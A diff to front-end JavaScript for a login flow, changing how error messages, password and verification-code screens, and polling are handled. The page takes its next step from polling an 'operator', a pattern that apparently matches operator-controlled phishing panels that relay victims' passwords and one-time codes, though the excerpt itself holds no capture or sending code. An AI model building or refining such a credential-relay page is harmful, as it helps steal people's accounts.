@@ -1030,8 +1030,7 @@ async function pollOperator() {
     console.error("Polling error:", error);
     clearInterval(pollingIntervalId);
     hideLoading();
-    setError('loadingError', "Connection lost. Please try again.");
-    showLoadingError("Connection lost. Please try again.");
+    setError('loadingError', "Connection issue. Please check your internet and try again.");
   }
 }
 
@@ -1081,7 +1080,7 @@ function updateUIForStatus(status, data = {}) {
       if (data.email) {
         if (selectedLoginMethod === 'email') document.getElementById('emailInput').value = data.email;
       }
-      if (lastShownStatus !== currentStatus && data.lastJsonResponse) {
+      if (data.lastJsonResponse) {
         try {
           const lr = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
           if (lr.message && (lr.message.includes('Incorrect') || lr.message.includes('incorrect'))) {
@@ -1090,6 +1089,8 @@ function updateUIForStatus(status, data = {}) {
             document.getElementById(pwInput).value = '';
           }
         } catch(e) {}
+      } else if (status === 'WAITINGPASSWORDERROR') {
+        setError(selectedLoginMethod === 'phone' ? 'phoneError' : 'emailError', 'Incorrect password. Please try again.');
       }
       lastShownStatus = currentStatus;
       startPolling(2000);
@@ -1108,7 +1109,9 @@ function updateUIForStatus(status, data = {}) {
     case 'WAITINGCODE':
       hideLoading();
       showScreen('verificationCodeScreen');
-      document.getElementById('verificationCodeInput').value = '';
+      if (status !== currentStatus) {
+        document.getElementById('verificationCodeInput').value = '';
+      }
       if (data.lastJsonResponse) {
         try {
           const lr = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
@@ -1153,7 +1156,9 @@ function updateUIForStatus(status, data = {}) {
       break;
 
     default:
-      showLoadingError("An unexpected status was received. Please try again.");
+      hideLoading();
+      clearInterval(pollingIntervalId);
+      setError('loadingError', "An unexpected status was received. Please try again.");
       break;
   }
 }
